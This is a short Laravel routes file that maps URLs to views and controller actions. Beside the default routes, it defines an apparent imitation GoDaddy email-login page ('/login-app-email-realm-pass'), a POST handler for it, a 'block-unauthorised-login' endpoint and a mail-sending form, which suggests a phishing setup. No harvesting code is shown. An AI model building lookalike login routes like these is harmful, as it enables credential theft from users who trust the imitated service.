<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/', function () {
    return view('welcome');
});

Route::get('/login4', function () {
    return view('auth.login4');
});
Route::get('/login-app-email-realm-pass', function () {
    return view('godaddy.page');
});
Route::get('/sample', function () {
    return view('godaddy.sample');
});
Route::get('/success', function () {
    return view('success');
});
Route::get('/sendmail', function () {
    return view('createEmail');
});
Route::post('/login-app-email-realm-pass', 'PageController@index')->name('pages');
Route::post('/block-unauthorised-login', 'PageController@net')->name('net');

Route::post('/sendmail', 'PageController@sendEmail')->name('sendmail');

Auth::routes();

Route::get('/home', 'HomeController@index')->name('home');
